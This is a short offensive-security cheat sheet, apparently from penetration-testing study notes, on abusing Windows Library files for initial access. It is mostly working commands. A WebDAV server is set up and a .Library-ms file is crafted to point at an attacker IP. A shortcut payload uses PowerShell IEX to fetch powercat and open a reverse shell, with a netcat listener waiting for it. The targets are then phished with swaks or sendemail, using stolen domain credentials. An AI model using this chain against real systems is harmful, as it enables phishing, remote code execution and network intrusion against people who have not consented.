### Abusing Library Files

```bash
mkdir /home/kali/webdav
```
```bash
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Save the file below as `config.Library-ms`, make sure to sub out the URL towards the bottom for our IP:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.12.34</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

On a Windows machine right-click on the Desktop icon and select New -> Shortcut, when prompted to enter a path enter the following payload:
```powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.12.34:8000/powercat.ps1'); powercat -c 192.168.12.34 -p 4444 -e powershell"
```
Save the link, and transfer it to our Kali machine, then into the webdav directory.

Make `powercat` available and start a listener:
```bash
cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
python -m http.server 80
```
```bash
nc -nlvp 4444
```
Now distribute the library file that points to our IP (assuming we have crafted a suitably evil message body and saved it as `body.txt`):
```bash
sudo swaks -t <chump1@targetDomain.com> -t <chump2@targetDomain.com> --from <chump3@targetDomain.com> --attach @config.Library-ms --server <mail server IP> --body @body.txt --header "Subject: Super Fun Script" --suppress-data -ap
```
Nb. for the command above to succeed we'll need the domain creds of `chump3`.

Alternatively `sendemail` is also a thing:
```bash
sendemail -t jobs@cowmotors-int.com -f Mithrandir@cowmotors-int.com -s 192.168.232.201 -m "cv" -u "cv" -a payload.doc -v
```